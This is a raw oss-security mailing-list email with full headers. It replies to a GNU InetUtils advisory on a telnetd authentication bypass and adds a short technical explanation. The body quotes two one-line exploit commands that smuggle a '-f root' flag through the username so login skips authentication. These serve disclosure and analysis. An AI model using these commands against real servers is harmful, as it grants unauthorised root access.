Received: (qmail 22256 invoked by uid 550); 28 Jan 2026 21:06:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 9511 invoked from network); 28 Jan 2026 20:57:57 -0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=GnR+5w9DhPSW/zV1VwEkB69ez358JCoSlXkO18ganm64y0iTekbSo846OvH/ngSAvzw+BDmdAuYFzzFor6W/+h5K9a+NsJDQtrcTaBgTSbdDod3uswt75YX9G+FVMrYXHmY1hrHxaO90ECrUMvdTizx5yq3NnTfVjmAEeJYa/YH2V6yaA2nVCZ89Xou+wPUgb5fWJv1CMbDEmmBbmV0mpIPUFz5Om3lqdIMb4DBPUYBPoZbKMKblL9x51pSovR7dfrwpHszWaB70jkcOGib65rrLVUhNjzrs4Cv9irIRMWfluSbsv5NowA4A7tPbLqueMw+9zvfUjl92MTCAejXtoQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=oxwsBI2AoiBOUDoDdspQfIP23dIMUoPfrm+Ztvp8z8s=;
 b=wYpNBovaIp5h3Tachg/T3NcQ7zkRIgUsm9qrXfnzI1joZ0nG5dAsnv8kPQoIA/2W0HN+kb4eKNU/mlGGNaahUGDV5jjM5eZ+o0UWveXLdHc2/bI0BOrADO3Z0F7VjNAFO8OwOTKyfYWAytRNP6IiZ09IatlvjbB4DD4Au3AnwVRAAm75kSPMuFHdEoi0X8tq+KISKCLCZiXHkm8zNAvoOsb2GCaik0IY4HpKDOwV5Rhj3P4K+3N6cMNcPglQ0Tv7iESF3PgntnMXGQeZpqzKWr/9DP/goEY3Czljq+tQHU/jd3Nqp+Sy3wi9we/SfgQX0pPIydpaZxO9F7Yquh+ZdQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=outlook.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=oxwsBI2AoiBOUDoDdspQfIP23dIMUoPfrm+Ztvp8z8s=;
 b=t/SKqxURuAmFtWKy27rTNZF04OK59f44Bk+jgO8n6Kbtw8PnoX1MEm1RIRlCf5iOQeOBKvAXkBOzagFpFkCfiooTvhMQTQn13oOh90b/AJ4ijc5QgWFUHE+Go1lVQrg6AXxLrVSjcpXKOJfM9V6dnBkfWMlhAVVbduWMSSQrPge8vCtL9KEqevCCUSTB+jDZ9ywnCXD1IMA6KtEAkZ3KxDFiaaNzUGVyhPv7fcdfbGCclhgdW6y2UZwUEJViVYBEM339xaLlzXMDWnhj2BZ3ZvKiCW2CiqQwpRo+vYxK8sb9y5yebd0iBwKgQR2lGLZyCM1M+bCYe/sQc9GUKpmwwA==
From: Paul Ducklin <pducklin@outlook.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: GNU InetUtils Security Advisory: remote authentication by-pass
 in telnetd
Thread-Index: AQHckJajzgzh3PI8Q0efBu4sleqUbA==
Date: Wed, 28 Jan 2026 20:57:46 +0000
Message-ID:
 <GVZP280MB1479548BB600609B081F6286DE91A@GVZP280MB1479.SWEP280.PROD.OUTLOOK.COM>
Accept-Language: en-GB, af-ZA, it-IT, en-US
Content-Language: en-GB
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
msip_labels:
x-ms-exchange-messagesentrepresentingtype: 1
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: GVZP280MB1479:EE_|MM0P280MB0832:EE_
x-ms-office365-filtering-correlation-id: a36ebdec-f37e-4bd8-1c18-08de5eafe3e3
x-ms-exchange-slblob-mailprops:
 bHQ38DpbEWAayy1Fxvh9DGGZQkLoCo9lLyi570Oz5aCCctieTQPxmKLbjlTRr/uoUY9NSkLksr0/j+Iol92DUIoBnjWocGUofVoPkchn23JrGEWYRTYHjG2t0MNc0oOELiFYb2vcAycTbBGQWaQuu7oObsLpA7N6GO2tbFXnB+ujsM4qvkqUD5G80ID4UXBaxOzs77DWiP/SKsbKYPSY38HzIm34EaXZBcMB1O9rDci+TdTdmg5fr60BK/32D8xn6OR3a3uSEGOCkIKmCoB10ZVDo2h+Gh/BY1S3C5QHMiYLYsQU5tNIKsZuE7nkvyWsDUO+srf5gTbRB7xIFJ+/IfYmriX+H52mRMHzMqMWzlefYj240ASY3wiFl1wite268anlbtutompXIoARD0Lu6+83/doebmrCLY4ap6agH3OldRMkzTeNo3vO12ng+ZYkwDxShDDVV3vRlf46HlDHUqRLM2ygK9SwWVzjwSdZPZESkNuG9XqFbWCAK+KJXTES86bemZe+OpeUZdgVKiMRl36jJsQknMh9d6CtCvodp6eTq20e/0ja5I33CnnepDJ4mjQoZb41R50AeajXZkA2CogPDYL8fgAUj7BmdGKO2pIiE8QLJBThBM+ThPxdMeXzIHTw5zJLVpYTXBfiYfCXAh9rPbI2UAL4Dig3ecT8mnwtmYjDwkAPvg==
x-microsoft-antispam:
 BCL:0;ARA:14566002|461199028|31061999003|20031999003|55001999003|21061999006|8060799015|8062599012|19110799012|39105399006|15080799012|15030799006|10092599007|440099028|3412199025|40105399003|102099032|19061999003;
x-microsoft-antispam-message-info:
 =?iso-8859-1?Q?7rQO7mc8MarwQJgl2iAooy7sucwS6CDFt0F5rPqXUyl868iSM7H21Jbxgp?=
 =?iso-8859-1?Q?gPGhSUnW2XJ8WnwHvdU1jwyJ3R1SpkX5YuAIhpxAQDwZwh53abeKIAw6JZ?=
 =?iso-8859-1?Q?rseT7FjNwBVWnqrIOzoPlksSpOXcP0dIEoRPfI4hcy4mRuzk42/ACwZzO/?=
 =?iso-8859-1?Q?j3SftBgH3oi4Yu/X/p3Xr9RjrekwI+WJeDA9rIE6NJZIbcnZtVsW8ggTBv?=
 =?iso-8859-1?Q?+J4Mua4e5mQOIitVBIIIZIdes6IDjFphIyjSR2hGxXK/2Qpo8EnAfEArTt?=
 =?iso-8859-1?Q?9sT1S+LaLutAtOENscx1FXzrmoY/g59Zx5K6vv6fa7V9av8sgmAEPXj22K?=
 =?iso-8859-1?Q?UDd3ErTuSrbFOaynEuDXmGLNyxH2KEBSBFH8muT6DCgitZc41taARZ7Vgl?=
 =?iso-8859-1?Q?D/n/PKsiOfe6y1ICO8/OtdHIWJqjB+R40AAthUerNkCQz2FXyG/ZGQgmHC?=
 =?iso-8859-1?Q?EWFFTWe0UNBgx4NUgzkNQB8h/xF+fS2+y0f+XzdOMtj2EntT4vLLPb51De?=
 =?iso-8859-1?Q?+z2bKIDvLvblL+qb/u0nKqGY9ZhimlL337pZPbQ5IvKIVLSNC1vdDzlytM?=
 =?iso-8859-1?Q?yDKrSiMzWKHlCJhI8Icj75fPrHVlZqVxxEpx0jBHImpdDBXsjes8/tVtel?=
 =?iso-8859-1?Q?FS4Ptpk7kFgu4Y0bjpaa/UBP518aKdMXsEAqxL54faB0KK4GXmMPC1Oyq3?=
 =?iso-8859-1?Q?FPGtYUjezhpSW0tHCP7j3cj4b+WIrT1fl7mfADfBs7k9MWH8Rw7jmpbQ6P?=
 =?iso-8859-1?Q?Wg0wFcB4SXI0DCi4V8EodxJLXQqTK2N7t4gFSEyiudqvjjlTNThRXQzKf/?=
 =?iso-8859-1?Q?56BVnHIri13i1FCzkyrtvv8eLWudOxhUiQsYeMKmUNemrUO99PdjrmEL/4?=
 =?iso-8859-1?Q?OfQeIpYlCIcL03VMm/vC5g1bLSjUPAkZbCwk1pMGpu03L5BAHSNMJg3Idn?=
 =?iso-8859-1?Q?N7co4U4B2noO4WUlohfOQhtZnDcGhW2ITR8kOstGWy/evrd+n9DDk44Ybi?=
 =?iso-8859-1?Q?Pi2KwfCFF3xQwMNPmyjgKIpUFtxJ3CSwdhRyYcw2M5nfI1Zap+DOxexm2B?=
 =?iso-8859-1?Q?7Pcqm5YSUFt/xZo/ZDOyvMHLfPlfLwu2ndx9oLNjNqTVbZKv2SlCm4BN1/?=
 =?iso-8859-1?Q?vP4/k7r4rQ9cjopKTJQhnCodn/gFRo0WUu5xUEEQpeEhlMmyCHg8esrxLN?=
 =?iso-8859-1?Q?uA9/N3MrcrGbrgAJ99vtrmBJ8TyNhWby8glqgVGkFiubh5ypFolM7IoI6k?=
 =?iso-8859-1?Q?3XW770zB9J0rnKkXrXFGMj0kcsTK00m5M3/t7Qnuju9wlDgYuIXrVRGF8n?=
 =?iso-8859-1?Q?kWNjTC4f4fi3YwX7HbS83DLSYjbyfQ/bUhy8AFGOfXi1kH7H6YPtXLSOjC?=
 =?iso-8859-1?Q?gLlLmg7u5IJyr+xXpTXdPiLs+A+jtImdMKe7yn0YECsGjMHllCcbbRSCzA?=
 =?iso-8859-1?Q?GfsgB/1Erq8tqx+n?=
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?iso-8859-1?Q?Br8ElJoUBcjbPVTst6PL/QLawyfsFSoFihzLZuakwtW2fCTMNcLI0LtJ6p?=
 =?iso-8859-1?Q?AUMb2/jvBBV6I0jNi4bJ6AWvn4UEK7+DrV8iWNMY5eZn8F0AyDsRCpLm/t?=
 =?iso-8859-1?Q?sI/o7zaNuG7J0hqP7dHKw5FIdrJuKZ4lQs16hQe6ub/BxL0GrGZ89/P1r3?=
 =?iso-8859-1?Q?3XvTv7KosgD2uYOD5tDwjP/nVTTnhYA9QiiMuJK2m6VJPe2yjPODxxEUU/?=
 =?iso-8859-1?Q?2XSDBKF0QO0wg0iAymVfMeS/e6VONqynY1T1Vk1sWpTVePnuYbAQzTP2eO?=
 =?iso-8859-1?Q?V4YWyq2vjSVyS2Eh7r57yXjOrC8og+105jLXcWM7lQcsrmAY2r538ecHjI?=
 =?iso-8859-1?Q?ZOiDkV3/URKWnO7FIsV69z8zeRuxcamKN6H0ufj6A/LPbWlEDKnEsAhM97?=
 =?iso-8859-1?Q?RzGFU9xVIIF8Hs5yQH8JAD7SIVxkzVSGjEBkKBQDVJlX+goZhz7hujDBFM?=
 =?iso-8859-1?Q?TGq1tldrfyaIahhTN97XW8kDLtf39Wjo6URI3rkHRtZtETdupoNX7/4jmP?=
 =?iso-8859-1?Q?1JUgSAN7UZa1uENacGTxPApPFc+w4ZQR9+MYjqtlxP9KhnRhA+9pVogs3R?=
 =?iso-8859-1?Q?TY4/qbv8gdQhnqb3mUeXm/tTT4jPAMJkPC835S5JZKcpyiJZD4WdnuNKJC?=
 =?iso-8859-1?Q?9mZuNYoQPS/behAa9GhAsTTKR9nYc1aJdV2qxeuyDnbWmieURls2UuQ9UE?=
 =?iso-8859-1?Q?zb56Wdqi34cJXxibDgyJugmZhMGo3Bjac0GSC+vOHcwFbGHrnhYixkiXcx?=
 =?iso-8859-1?Q?19pH0rvs1nWv3Rso2X5B2VbGpz43BVEQGdhdHD4VlJnZ6ju8IPJbUlg5bv?=
 =?iso-8859-1?Q?T8VfHMH0yz4Ts5hHl4LEHZPi5QztOVyhvWsjc96LVr0NEqwreuWTHeY6ce?=
 =?iso-8859-1?Q?QEXGFWw0Nxt+jPKY98h1BJii6m2Z6I9vM+tsRMUnIkXp0q5orkyNOIg74C?=
 =?iso-8859-1?Q?cLIjLAzhlzBseeIhBQJxXK8lBWlMB8yUL8YE+Zo7ENNjrZYTEW7fzfIVQc?=
 =?iso-8859-1?Q?+MjRgVHzSuBw3cQcR0o1J5gxQg+oNuxxvAAGi6pd0WK+scG14/vd3Cib/X?=
 =?iso-8859-1?Q?Nlp4RYb3MnRpDSFVTVo/JK7DsEGIDvbv0/4uUbwUrABFVAnqr9DzC8zi06?=
 =?iso-8859-1?Q?1C+vRzqgBwl7sU4fJ0Ir3UDgFc8pyfTDVwhruUK8yUa/E4UgjKwprUmV6b?=
 =?iso-8859-1?Q?Ykzh+anfWu6A5xsuh/nbkgcEl0pvuJ+rjymZDkjxTmZcJ7ykzRyziOPLz/?=
 =?iso-8859-1?Q?mEsvuFmOhZQVeXe5m7OlK3VCTjJFSI92+P/hVrvjEUPWEW7FvaP2sG+oun?=
 =?iso-8859-1?Q?kRN/bFqUsxGwdy7PyPIcaxzA4S9Ppr6BV9Uixey0pgFiC+GMT8IOE2vy+Y?=
 =?iso-8859-1?Q?7CnuIn/dwaNCRksKTOySx7uORLFtj1AssVTkeeQgBaLe5pwt5EQ5s=3D?=
Content-Type: multipart/alternative;
	boundary="_000_GVZP280MB1479548BB600609B081F6286DE91AGVZP280MB1479SWEP_"
MIME-Version: 1.0
X-OriginatorOrg: outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: GVZP280MB1479.SWEP280.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-CrossTenant-Network-Message-Id: a36ebdec-f37e-4bd8-1c18-08de5eafe3e3
X-MS-Exchange-CrossTenant-originalarrivaltime: 28 Jan 2026 20:57:46.8170
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-rms-persistedconsumerorg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: MM0P280MB0832
Subject: [oss-security] Re: GNU InetUtils Security Advisory: remote authentication by-pass in
 telnetd

--_000_GVZP280MB1479548BB600609B081F6286DE91AGVZP280MB1479SWEP_
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

> USER=3D'-f root' telnet -a localhost

Seems that the same code path results from the even simpler incantation:

$ telnet -l 'root -f' server.test

The user-name-with-a-space-in-it doesn't get passed as a single argument
to execv(), but "helpfully" gets split back into two parts and passed to ex=
ecv()
as two separate entries in argv[] :-)

Q. "Hey, if we call execv() directly, we'll avoid some of the risks associa=
ted with
shell-style command line processing. How good is that?"

A. "Hold my beer."

TELNET, eh? From the days when RFCs still had just three digits...


--_000_GVZP280MB1479548BB600609B081F6286DE91AGVZP280MB1479SWEP_--
